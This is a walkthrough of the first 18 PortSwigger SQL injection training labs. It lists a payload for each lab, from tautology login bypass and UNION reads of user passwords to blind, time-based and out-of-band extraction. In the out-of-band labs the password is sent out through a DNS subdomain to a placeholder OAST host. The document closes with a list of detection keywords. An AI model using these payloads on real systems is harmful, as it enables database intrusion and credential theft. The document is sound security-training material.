# PortSwigger SQL Injection 1-18 — From Tautologies to OOB Exfiltration

A consolidated walkthrough of the first 18 PortSwigger Web Security Academy SQL injection labs, treated as one methodology track rather than 18 isolated puzzles. Individual lab cards are archived separately; this note is the series itself: an overview table, a feedback-channel ladder, an extraction decision tree, and detection mapping.

**Thesis:** exploitation speed equals how fast you identify the *feedback channel*. Once you know whether the app gives you content, auth state, errors, timing, or an OOB callback, the rest is syntax.

## 1. Overview table

| # | Lab | Difficulty | Injection surface | Channel | Technique | Core payload |
|---|-----|-----------|-------------------|---------|-----------|--------------|
| 1 | hidden_data | Apprentice | `category` | content | tautology + comment | `' OR 1=1--` |
| 2 | login_bypass | Apprentice | `username` | auth state | comment out password check | `administrator'--` |
| 3 | union_column_count | Practitioner | `category` | content | UNION NULL probe (=3 cols) | `' UNION SELECT NULL,NULL,NULL--` |
| 4 | union_text_column | Practitioner | `category` | content | find text-rendering column | `' UNION SELECT NULL,'abc',NULL--` |
| 5 | union_retrieve_other_tables | Practitioner | `category` | content | UNION read users | `' UNION SELECT username,password FROM users--` |
| 6 | union_multiple_values_single_column | Practitioner | `category` | content | single-column concat | `' UNION SELECT NULL,username\|\|'~'\|\|password FROM users--` |
| 7 | mysql_microsoft_version | Practitioner | `category` | content | `@@version` | `' UNION SELECT NULL,@@version-- -` |
| 8 | oracle_version | Practitioner | `category` | content | `v$version` banner | `' UNION SELECT NULL,banner FROM v$version--` |
| 9 | non_oracle_contents | Practitioner | `category` | content | `information_schema` enum | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
| 10 | oracle_contents | Practitioner | `category` | content | `all_tables`/`all_tab_columns` | `' UNION SELECT table_name,NULL FROM all_tables WHERE table_name LIKE 'USERS_%'--` |
| 11 | blind_conditional_responses | Practitioner | `TrackingId` cookie | conditional content | boolean blind | `x' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='j'--` |
| 12 | blind_conditional_errors | Practitioner | `TrackingId` cookie | conditional error | `CASE WHEN ... THEN TO_CHAR(1/0)` | `'\|\|(SELECT CASE WHEN (…) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')\|\|'` |
| 13 | time_delay | Practitioner | `TrackingId` cookie | latency | trigger visible delay | `'\|\|pg_sleep(10)-- -` |
| 14 | time_delay_extraction | Practitioner | `TrackingId` cookie | latency | conditional sleep + binary search | `'\|\|(SELECT CASE WHEN (…) THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--` |
| 15 | visible_error_based | Practitioner | `TrackingId` cookie | visible error | `CAST` type-cast error | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ` |
| 16 | oob_interaction | Practitioner | `TrackingId` cookie | OOB (DNS/HTTP) | Oracle `EXTRACTVALUE(xmltype())` | `x' UNION SELECT EXTRACTVALUE(xmltype('…SYSTEM "http://<oast>/"…'),'/l') FROM dual--` |
| 17 | oob_exfiltration | Practitioner | `TrackingId` cookie | OOB (DNS subdomain) | password in subdomain | `x' UNION SELECT EXTRACTVALUE(xmltype('http://'\|\|password\|\|'.<oast>/'),'/l') FROM dual--` |
| 18 | xml_encoding_bypass | Practitioner | `POST /product/stock` `storeId` (XML) | content | XML hex-entity WAF bypass | `hex_entities(1 UNION SELECT username\|\|'~'\|\|password FROM users)` |

## 2. The feedback-channel ladder

SQL injection is not one technique — it is a family of ways to turn a database parser into an oracle.

1. **Direct predicate control** (1-2): the attacker controls bytes parsed as SQL, not data. `' OR 1=1--`, `administrator'--`.
2. **Fingerprint first** (7-8): `@@version` (MySQL/MSSQL), `banner FROM v$version` with `FROM dual` (Oracle), `version()` (PostgreSQL). Dialect dictates metadata syntax.
3. **Metadata enumeration** (9-10): `information_schema.tables/columns` (non-Oracle, lowercase random names) vs `all_tables/all_tab_columns` (Oracle, uppercase). Workflow: find users table → find columns → extract admin creds → `/login`.
4. **UNION mechanics** (3-6): column count → text-rendering column → concatenate (`username||'~'||password`, or `CONCAT()` on MySQL).
5. **Blind oracles** (11-15): conditional content, conditional error, time delay, conditional time delay, visible error. Prefer cheaper channels (error/boolean) over time-based.
6. **Out-of-band** (16-17): force a DB-originated DNS/HTTP request via `EXTRACTVALUE(xmltype())`; exfiltrate by placing data in the subdomain.
7. **WAF bypass** (18): full XML hex-entity encoding; the parser decodes entities before the DB sees SQL, defeating raw-byte filters.

## 3. Extraction decision tree

```
Visible content?
├─ yes → UNION (column count → text column → concat)
└─ no  → Detailed error shown?
         ├─ yes → error-based (CAST; keep payload short)
         └─ no  → Response changes with condition?
                  ├─ yes → boolean blind (conditional response / error)
                  └─ no  → Stable timing difference?
                           ├─ yes → time-based (conditional sleep + binary search)
                           └─ no  → OOB (EXTRACTVALUE/xmltype → OAST; subdomain exfil)
```

## 4. Field notes / gotchas

- **Oracle banner placement**: the version string must land in a *visible* column; lab 8 only solved with `banner` in column 2.
- **Time-based jitter**: a 1 s sleep gave a plausible 20-char password with 3 wrong chars; a targeted 2-3 s recheck on suspicious positions fixed it. Cheap probes first, expensive probes only where uncertain.
- **Error truncation**: the visible-error lab truncated long SQL. Dropping the original `TrackingId` prefix shortened the payload so the password fit inside the error.
- **OOB collaborator**: a public interactsh domain triggered interactions in self-tests but did not reliably solve the Academy OOB labs; a Burp/OAST domain did. Subdomain exfil is bounded by the 63-char DNS label limit.
- **XML encoding**: encode *every* character as a hex entity — encoding only spaces/quotes does not defeat keyword matching.

## 5. Defensive takeaways

- **Prepared statements** are the only root fix; watch ORMs for raw/string-built queries too.
- Least-privilege DB accounts: deny metadata tables (`information_schema`/`all_tables`), network functions, and XML external entities.
- Disable verbose SQL error output (labs 12/15 weaponize the error channel directly).
- **Detection by observable surface**, not one giant regex:
  - parameters/paths with `' OR`, `UNION SELECT`, `ORDER BY n--`;
  - SQL keywords in cookies (analytics cookies like `TrackingId`);
  - SQL keywords in XML bodies *after entity decoding*;
  - DB errors surfaced in HTTP responses;
  - abnormal DB-originated DNS/HTTP egress;
  - `pg_sleep` / `WAITFOR DELAY` / `DBMS_LOCK.SLEEP`.
- The detection source of truth is the **decoded application-layer value**, not raw bytes — lab 18 exists to prove this. A successful WAF bypass is evidence that server-side parameterization was missing; the WAF is mitigation, not a fix.
